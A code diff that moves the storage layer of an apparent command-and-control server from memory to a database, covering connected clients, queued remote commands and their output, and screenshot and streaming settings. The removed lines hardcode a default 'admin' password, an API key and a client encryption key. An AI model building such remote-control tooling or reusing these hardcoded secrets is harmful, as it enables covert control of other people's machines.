@@ -1,10 +1,7 @@
-import { 
-  User, InsertUser, 
-  Client, InsertClient, 
-  Command, InsertCommand, 
-  Activity, InsertActivity, 
-  Setting, InsertSetting 
-} from "@shared/schema";
+import { eq, desc, asc, and, or, gte, lte, like, sql } from "drizzle-orm";
+import { users, type User, type InsertUser, clients, type Client, type InsertClient, commands, type Command, type InsertCommand, 
+  activities, type Activity, type InsertActivity, settings, type Setting, type InsertSetting } from "@shared/schema";
+import { db } from "./db";
 
 export interface IStorage {
   // User operations
@@ -45,305 +42,298 @@ export interface IStorage {
   getStats(): Promise<any>;
 }
 
-export class MemStorage implements IStorage {
-  private users: Map<number, User>;
-  private clients: Map<number, Client>;
-  private commands: Map<number, Command>;
-  private activities: Map<number, Activity>;
-  private settings: Map<number, Setting>;
-  
-  private currentUserId: number;
-  private currentClientId: number;
-  private currentCommandId: number;
-  private currentActivityId: number;
-  private currentSettingId: number;
-  
-  constructor() {
-    this.users = new Map();
-    this.clients = new Map();
-    this.commands = new Map();
-    this.activities = new Map();
-    this.settings = new Map();
-    
-    this.currentUserId = 1;
-    this.currentClientId = 1;
-    this.currentCommandId = 1;
-    this.currentActivityId = 1;
-    this.currentSettingId = 1;
-    
-    // Initialize with default admin user
-    this.createUser({
-      username: "admin",
-      password: "$2b$10$ZFVW0iFE3mNS3Oa0YsbE9OaQFx1wqgPRYX/qwupRB6.MlXI3Zs6.i", // "admin"
-      apiKey: "C2_SERVER_API_KEY"
-    });
-    
-    // Initialize with default settings
-    this.createSetting({
-      key: "screenshotQuality",
-      value: "50",
-      description: "Default screenshot quality (1-100)"
-    });
-    
-    this.createSetting({
-      key: "streamQuality",
-      value: "30",
-      description: "Default streaming quality (1-100)"
-    });
-    
-    this.createSetting({
-      key: "frameRate",
-      value: "5",
-      description: "Default frames per second for streaming"
-    });
-    
-    this.createSetting({
-      key: "encryptionKey",
-      value: "EynDnmNF4fipxGmiErq0hMOC-lXBuBxgRhIAHQDM8XA",
-      description: "AES-256 encryption key for client communications"
-    });
-    
-    this.createSetting({
-      key: "sessionTimeout",
-      value: "30",
-      description: "Session timeout in minutes"
-    });
-  }
-  
-  // User operations
+export class DatabaseStorage implements IStorage {
   async getUser(id: number): Promise<User | undefined> {
-    return this.users.get(id);
+    const [user] = await db.select().from(users).where(eq(users.id, id));
+    return user || undefined;
   }
-  
+
   async getUserByUsername(username: string): Promise<User | undefined> {
-    return Array.from(this.users.values()).find(
-      (user) => user.username === username,
-    );
+    const [user] = await db.select().from(users).where(eq(users.username, username));
+    return user || undefined;
   }
-  
+
   async getAllUsers(): Promise<User[]> {
-    return Array.from(this.users.values());
+    return await db.select().from(users);
   }
-  
+
   async createUser(insertUser: InsertUser): Promise<User> {
-    const id = this.currentUserId++;
-    const now = new Date();
-    const user: User = { ...insertUser, id, createdAt: now };
-    this.users.set(id, user);
+    const [user] = await db
+      .insert(users)
+      .values(insertUser)
+      .returning();
     return user;
   }
-  
-  // Client operations
+
   async getClient(id: number): Promise<Client | undefined> {
-    return this.clients.get(id);
+    const [client] = await db.select().from(clients).where(eq(clients.id, id));
+    return client || undefined;
   }
-  
+
   async getClientByClientId(clientId: string): Promise<Client | undefined> {
-    return Array.from(this.clients.values()).find(
-      (client) => client.clientId === clientId,
-    );
+    const [client] = await db.select().from(clients).where(eq(clients.clientId, clientId));
+    return client || undefined;
   }
-  
+
   async getAllClients(): Promise<Client[]> {
-    return Array.from(this.clients.values());
+    return await db.select().from(clients).orderBy(desc(clients.lastSeen));
   }
-  
+
   async getActiveClients(): Promise<Client[]> {
-    return Array.from(this.clients.values()).filter(
-      (client) => client.status === "active",
-    );
-  }
-  
-  async createClient(insertClient: InsertClient): Promise<Client> {
-    const id = this.currentClientId++;
-    const now = new Date();
-    const client: Client = { 
-      ...insertClient, 
-      id, 
-      firstSeen: now, 
-      lastSeen: now
-    };
-    this.clients.set(id, client);
+    // Consider clients active if they've been seen in the last 5 minutes
+    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
     
-    // Create an activity for the new client
+    return await db.select()
+      .from(clients)
+      .where(
+        and(
+          eq(clients.status, 'active'),
+          gte(clients.lastSeen, fiveMinutesAgo)
+        )
+      )
+      .orderBy(desc(clients.lastSeen));
+  }
+
+  async createClient(insertClient: InsertClient): Promise<Client> {
+    // First check if the client already exists
+    const existingClient = await this.getClientByClientId(insertClient.clientId);
+    
+    if (existingClient) {
+      // Update the existing client with new information
+      return await this.updateClient(insertClient.clientId, insertClient) as Client;
+    }
+    
+    // Create a new client if it doesn't exist
+    const [client] = await db
+      .insert(clients)
+      .values(insertClient)
+      .returning();
+    
+    // Create an activity log for the new client
     await this.createActivity({
       clientId: client.clientId,
-      type: "connection",
-      description: `New client connected: ${client.clientId}`,
-      data: { hostname: client.hostname, ip: client.ip }
+      type: 'connection',
+      description: `New client connected from ${client.ip}`,
+      data: { client: { ...client } }
     });
     
     return client;
   }
-  
+
   async updateClient(clientId: string, data: Partial<InsertClient>): Promise<Client | undefined> {
-    const client = await this.getClientByClientId(clientId);
-    if (!client) return undefined;
+    const [updatedClient] = await db
+      .update(clients)
+      .set(data)
+      .where(eq(clients.clientId, clientId))
+      .returning();
     
-    const updatedClient = { ...client, ...data, lastSeen: new Date() };
-    this.clients.set(client.id, updatedClient);
-    return updatedClient;
+    return updatedClient || undefined;
   }
-  
+
   async updateClientLastSeen(clientId: string): Promise<Client | undefined> {
-    const client = await this.getClientByClientId(clientId);
-    if (!client) return undefined;
-    
-    const updatedClient = { ...client, lastSeen: new Date() };
-    this.clients.set(client.id, updatedClient);
-    return updatedClient;
-  }
-  
-  // Command operations
-  async getCommand(id: number): Promise<Command | undefined> {
-    return this.commands.get(id);
-  }
-  
-  async getCommandsByClientId(clientId: string): Promise<Command[]> {
-    return Array.from(this.commands.values()).filter(
-      (command) => command.clientId === clientId,
-    );
-  }
-  
-  async getPendingCommands(clientId: string): Promise<Command[]> {
-    return Array.from(this.commands.values()).filter(
-      (command) => command.clientId === clientId && command.status === "pending",
-    );
-  }
-  
-  async getAllCommands(): Promise<Command[]> {
-    return Array.from(this.commands.values());
-  }
-  
-  async createCommand(insertCommand: InsertCommand): Promise<Command> {
-    const id = this.currentCommandId++;
     const now = new Date();
-    const command: Command = { 
-      ...insertCommand, 
-      id, 
-      createdAt: now,
-      completedAt: null 
-    };
-    this.commands.set(id, command);
     
-    // Create an activity for the new command
+    const [updatedClient] = await db
+      .update(clients)
+      .set({ lastSeen: now })
+      .where(eq(clients.clientId, clientId))
+      .returning();
+    
+    return updatedClient || undefined;
+  }
+
+  async getCommand(id: number): Promise<Command | undefined> {
+    const [command] = await db.select().from(commands).where(eq(commands.id, id));
+    return command || undefined;
+  }
+
+  async getCommandsByClientId(clientId: string): Promise<Command[]> {
+    return await db
+      .select()
+      .from(commands)
+      .where(eq(commands.clientId, clientId))
+      .orderBy(desc(commands.createdAt));
+  }
+
+  async getPendingCommands(clientId: string): Promise<Command[]> {
+    return await db
+      .select()
+      .from(commands)
+      .where(
+        and(
+          eq(commands.clientId, clientId),
+          eq(commands.status, 'pending')
+        )
+      )
+      .orderBy(asc(commands.createdAt));
+  }
+
+  async getAllCommands(): Promise<Command[]> {
+    return await db
+      .select()
+      .from(commands)
+      .orderBy(desc(commands.createdAt));
+  }
+
+  async createCommand(insertCommand: InsertCommand): Promise<Command> {
+    const [command] = await db
+      .insert(commands)
+      .values(insertCommand)
+      .returning();
+    
+    // Create an activity log for the new command
     await this.createActivity({
       clientId: command.clientId,
-      type: "command",
-      description: `Command executed on ${command.clientId}`,
-      data: { command: command.command, commandId: id }
+      type: 'command',
+      description: `Command sent to client: ${command.command.substring(0, 50)}${command.command.length > 50 ? '...' : ''}`,
+      data: { commandId: command.id }
     });
     
     return command;
   }
-  
+
   async updateCommandStatus(id: number, status: string, output?: string): Promise<Command | undefined> {
-    const command = await this.getCommand(id);
-    if (!command) return undefined;
-    
-    const updatedCommand: Command = { 
-      ...command, 
-      status, 
-      output: output || command.output,
-      completedAt: status === "completed" ? new Date() : command.completedAt 
+    const updates: Partial<Command> = { 
+      status,
+      ...(output !== undefined && { output }),
+      ...(status === 'completed' && { completedAt: new Date() })
     };
-    this.commands.set(id, updatedCommand);
     
-    // Create an activity for the command result
-    if (status === "completed") {
+    const [updatedCommand] = await db
+      .update(commands)
+      .set(updates)
+      .where(eq(commands.id, id))
+      .returning();
+    
+    if (updatedCommand && status === 'completed') {
+      // Create an activity log for the completed command
       await this.createActivity({
-        clientId: command.clientId,
-        type: "commandResult",
-        description: `Command result received from ${command.clientId}`,
-        data: { command: command.command, commandId: id, status }
+        clientId: updatedCommand.clientId,
+        type: 'command_result',
+        description: `Received result for command: ${updatedCommand.command.substring(0, 50)}${updatedCommand.command.length > 50 ? '...' : ''}`,
+        data: { commandId: updatedCommand.id, status }
       });
     }
     
-    return updatedCommand;
+    return updatedCommand || undefined;
   }
-  
-  // Activity operations
+
   async createActivity(insertActivity: InsertActivity): Promise<Activity> {
-    const id = this.currentActivityId++;
-    const now = new Date();
-    const activity: Activity = { ...insertActivity, id, createdAt: now };
-    this.activities.set(id, activity);
+    const [activity] = await db
+      .insert(activities)
+      .values(insertActivity)
+      .returning();
+    
     return activity;
   }
-  
+
   async getRecentActivities(limit: number = 20): Promise<Activity[]> {
-    return Array.from(this.activities.values())
-      .sort((a, b) => b.createdAt.getTime() - a.createdAt.getTime())
-      .slice(0, limit);
+    return await db
+      .select()
+      .from(activities)
+      .orderBy(desc(activities.createdAt))
+      .limit(limit);
   }
-  
+
   async getActivitiesByClientId(clientId: string): Promise<Activity[]> {
-    return Array.from(this.activities.values())
-      .filter((activity) => activity.clientId === clientId)
-      .sort((a, b) => b.createdAt.getTime() - a.createdAt.getTime());
+    return await db
+      .select()
+      .from(activities)
+      .where(eq(activities.clientId, clientId))
+      .orderBy(desc(activities.createdAt));
   }
-  
-  // Settings operations
+
   async getSetting(key: string): Promise<Setting | undefined> {
-    return Array.from(this.settings.values()).find(
-      (setting) => setting.key === key,
-    );
+    const [setting] = await db
+      .select()
+      .from(settings)
+      .where(eq(settings.key, key));
+    
+    return setting || undefined;
   }
-  
+
   async getAllSettings(): Promise<Setting[]> {
-    return Array.from(this.settings.values());
+    return await db
+      .select()
+      .from(settings);
   }
-  
+
   async updateSetting(key: string, value: string): Promise<Setting | undefined> {
-    const setting = Array.from(this.settings.values()).find(
-      (setting) => setting.key === key,
-    );
-    if (!setting) return undefined;
+    // Check if setting exists
+    const existingSetting = await this.getSetting(key);
     
-    const updatedSetting = { ...setting, value };
-    this.settings.set(setting.id, updatedSetting);
-    return updatedSetting;
-  }
-  
-  async createSetting(insertSetting: InsertSetting): Promise<Setting> {
-    const id = this.currentSettingId++;
-    const setting: Setting = { ...insertSetting, id };
-    this.settings.set(id, setting);
-    return setting;
-  }
-  
-  // Stats operations
-  async getStats(): Promise<any> {
-    const activeClients = await this.getActiveClients();
-    const allCommands = await this.getAllCommands();
-    const completedCommands = allCommands.filter(cmd => cmd.status === "completed");
-    
-    // Count streams by looking at activities for stream_start without corresponding stream_stop
-    const streamActivities = Array.from(this.activities.values())
-      .filter(activity => ["streamStart", "streamStop"].includes(activity.type));
-    
-    const streamsByClient = new Map<string, boolean>();
-    
-    for (const activity of streamActivities) {
-      if (activity.clientId) {
-        if (activity.type === "streamStart") {
-          streamsByClient.set(activity.clientId, true);
-        } else if (activity.type === "streamStop") {
-          streamsByClient.set(activity.clientId, false);
-        }
-      }
+    if (!existingSetting) {
+      return undefined;
     }
     
-    const activeStreams = Array.from(streamsByClient.values()).filter(isActive => isActive).length;
+    const [updatedSetting] = await db
+      .update(settings)
+      .set({ value })
+      .where(eq(settings.key, key))
+      .returning();
+    
+    return updatedSetting || undefined;
+  }
+
+  async createSetting(insertSetting: InsertSetting): Promise<Setting> {
+    // Check if setting already exists
+    const existingSetting = await this.getSetting(insertSetting.key);
+    
+    if (existingSetting) {
+      // Update the existing setting
+      const updated = await this.updateSetting(insertSetting.key, insertSetting.value);
+      return updated as Setting;
+    }
+    
+    // Create a new setting
+    const [setting] = await db
+      .insert(settings)
+      .values(insertSetting)
+      .returning();
+    
+    return setting;
+  }
+
+  async getStats(): Promise<any> {
+    const activeClientsCount = (await this.getActiveClients()).length;
+    const totalClientsCount = (await this.getAllClients()).length;
+    const commandsCount = (await this.getAllCommands()).length;
+    
+    const completedCommandsCount = await db
+      .select({ count: sql<number>`count(*)` })
+      .from(commands)
+      .where(eq(commands.status, 'completed'));
+    
+    const pendingCommandsCount = await db
+      .select({ count: sql<number>`count(*)` })
+      .from(commands)
+      .where(eq(commands.status, 'pending'));
+    
+    const failedCommandsCount = await db
+      .select({ count: sql<number>`count(*)` })
+      .from(commands)
+      .where(eq(commands.status, 'failed'));
+    
+    // Get last 24 hours of activities
+    const oneDayAgo = new Date(Date.now() - 24 * 60 * 60 * 1000);
+    const recentActivities = await db
+      .select()
+      .from(activities)
+      .where(gte(activities.createdAt, oneDayAgo))
+      .orderBy(desc(activities.createdAt));
     
     return {
-      activeClientCount: activeClients.length,
-      totalClientCount: this.clients.size,
-      commandsExecuted: completedCommands.length,
-      totalCommands: allCommands.length,
-      activeStreams
+      activeClients: activeClientsCount,
+      totalClients: totalClientsCount,
+      commands: {
+        total: commandsCount,
+        completed: completedCommandsCount[0]?.count || 0,
+        pending: pendingCommandsCount[0]?.count || 0,
+        failed: failedCommandsCount[0]?.count || 0
+      },
+      recentActivities: recentActivities.slice(0, 10)
     };
   }
 }
 
-export const storage = new MemStorage();
+export const storage = new DatabaseStorage();
